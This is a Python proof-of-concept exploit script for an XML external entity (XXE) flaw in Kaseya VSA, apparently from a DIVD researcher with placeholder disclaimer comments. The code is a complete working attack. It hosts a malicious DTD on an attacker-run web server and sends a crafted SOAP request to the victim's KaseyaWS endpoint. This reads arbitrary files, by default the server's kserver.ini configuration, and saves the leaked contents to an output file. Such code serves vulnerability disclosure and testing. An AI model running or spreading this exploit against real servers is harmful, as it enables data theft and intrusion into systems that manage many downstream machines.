#!/bin/python3
#############
# SOME DISCLAIMER HERE
# WIETSE FOUND IT
# DIVD STUFF
# DONATE LINK
# 
#  _____ _______      _______         _ 
# |  __ \_   _\ \    / /  __ \       | |
# | |  | || |  \ \  / /| |  | | _ __ | |
# | |  | || |   \ \/ / | |  | || '_ \| |
# | |__| || |_   \  /  | |__| || | | | |
# |_____/_____|   \/   |_____(_)_| |_|_|                                     
#
#############

from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import urllib.parse
import requests
import threading
import argparse
from argparse import RawTextHelpFormatter
from urllib.parse import urlencode, urlparse
import codecs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def writeToFile(outFile,line, lfi):
    f=open(outFile, "a+")
    f.write("{0} {1} {0}\r\n".format("#-------------------#",lfi))
    f.write("{}\r\n".format(line))
    f.write("{0} {1} {0}\r\n".format("#-------------------#",lfi))
    f.close()


def req(victimUrl,attackerUrl):
    data = """
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:kas="KaseyaWS">
   <soapenv:Header/>
   <soapenv:Body>
      <kas:PrimitiveResetPassword>
         <!--type: string-->
         <kas:XmlRequest>
            <![CDATA[
             <!DOCTYPE data SYSTEM "{}"><data>&send;</data>
            ]]>
        </kas:XmlRequest>
      </kas:PrimitiveResetPassword>
   </soapenv:Body>
</soapenv:Envelope>
    """.format(attackerUrl)
    response = requests.post(
        victimUrl,
        data=data,
        headers={
            'User-Agent' : 'DIVD.nl - Wietse Boonstra',
            'Content-Type' : 'text/xml;charset=UTF-8'
            },
        verify=False
        )
    
    # print ("Sending: {}".format(response.request.url))
    try:
        left = "identifier '"
        right = ".txt"
        text = response.text
        # print (text)
        # print (text.index(left)+len(left))
        # print (text.index(right))
        result = text[text.index(left)+len(left):text.index(right)]
        # result = codecs.decode(result, "unicode_escape")
        print (result)
        writeToFile(outputFile,result,lfi)

    except Exception as e:
        # print (e)
        print (response.text)
        writeToFile(outputFile,response.text,lfi)

    #We dont care about the program, so kill it!
    os._exit(1)
 
class XXE(BaseHTTPRequestHandler):
    def do_GET(self):
        # para = urllib.parse.parse_qs(self.path[2:])
        # f = para['f'][0]
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        #The variable lfi is a global one, containing the file location we want to read.
        xml = """<!ENTITY % file SYSTEM "{}://{}"><!ENTITY % t "<!ENTITY rrr SYSTEM 'file:///%file;.txt'>">%t;""".format(scheme, lfi)
        xml = bytearray(xml,"utf8")
        self.wfile.write(xml)


def run(serverIp, port, server_class=HTTPServer, handler_class=XXE):
    server_address = (serverIp, port)
    httpd = server_class(server_address, handler_class)
    print('Starting httpd on port {}'.format(port))
    httpd.serve_forever()



if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        __file__,
        description="""
Exploit POC for Kaseya XXE.
#############
# SOME DISCLAIMER HERE
# WIETSE FOUND IT
# DIVD STUFF
# DONATE LINK
# 
#  _____ _______      _______         _ 
# |  __ \_   _\ \    / /  __ \       | |
# | |  | || |  \ \  / /| |  | | _ __ | |
# | |  | || |   \ \/ / | |  | || '_ \| |
# | |__| || |_   \  /  | |__| || | | | |
# |_____/_____|   \/   |_____(_)_| |_|_|                                     
#
#############
""",
formatter_class=RawTextHelpFormatter,
        usage="""
    python3 %(prog)s -f [file/dir on target to request] -i [ip of attacker webserver] -p [port of attacker webserver] -u [Kaseya server] -o [outputfile]
    
    python3 %(prog)s -f c:\\boot.ini -i 192.168.1.100 -p 8081 -u https://kaseya.target.ext/ -o outputfile.txt

    This will host an XML (<!ENTITY %% file SYSTEM "file:///c:\\boot.ini"><!ENTITY %% t "<!ENTITY rrr SYSTEM 'file:///%%file;.txt'>">%%t) on http://192.168.1.100:8081 and send an request to https://kaseya.target.ext and writes the response to outputfile.txt and console.

   
        """
    )
    targetArgs = parser.add_argument_group("target")
    targetArgs.add_argument("-i",
        help="IP of attacker, this will host the XXE",
        required=True
    )
    targetArgs.add_argument("-p",
        help="Port of attacker, this will host the XXE",
        type=int,
        default=8081
    )
    victimArgs = parser.add_argument_group("victim")
    victimArgs.add_argument("-f",
        help="File or directory to request on victim",
        default="c:\\kaseya\\kserver\\kserver.ini"
    )
    victimArgs.add_argument("-u",
        help="URL of Kaseya http://victim:5721/",
        required=True
    )

    globalArgs = parser.add_argument_group("global")
    globalArgs.add_argument("-o",
        help="Output file",
        default="output.txt"
    )

    #Parsing the arguments:
    args = parser.parse_args()

    outputFile = args.o.strip()
    f = args.f.strip()
    up = urlparse(f)
    if not up.hostname:
        lfi = up.path
    else:
        lfi = "{}{}".format(up.hostname, up.path)
        
    scheme = up.scheme
    serverIp = args.i.strip()
    port = args.p
    victimUrl = args.u.strip()
    victimUrl = "{}/vsaWS/KaseyaWS.asmx".format(victimUrl)
    #The URL that will server our XXE
    attackerUrl = "http://{}:{}/".format(serverIp,port)

    #Starting the thread for our webserver.
    print ("Starting webserver in the background to host XML")
    x = threading.Thread(target=run, args=(serverIp, port))
    x.start()

    print ("Sending Payload!")
    req(victimUrl,attackerUrl)